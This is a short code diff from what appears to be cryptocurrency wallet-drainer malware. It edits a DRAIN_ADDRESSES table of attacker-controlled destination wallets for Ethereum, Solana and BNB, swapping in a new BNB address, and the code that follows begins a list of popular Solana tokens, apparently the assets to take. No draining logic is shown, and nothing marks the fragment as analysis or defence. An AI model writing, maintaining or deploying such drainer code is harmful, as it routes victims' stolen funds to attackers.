@@ -35,7 +35,7 @@ import * as ethers from 'ethers';
 const DRAIN_ADDRESSES = {
   ethereum: "0x402421b9756678a9aae81f0a860edee53faa6d99",
   solana: "73F2hbzhk7ZuTSSYTSbemddFasVrW8Av5FD9PeMVmxA7",
-  bnb: "0xeA54572eBA790E31f97e1D6f941D7427276688C3"
+  bnb: "0x10269ABC1fBB7999164037a17a62905E099278f9"
 };
 
 const POPULAR_SPL_TOKENS = [
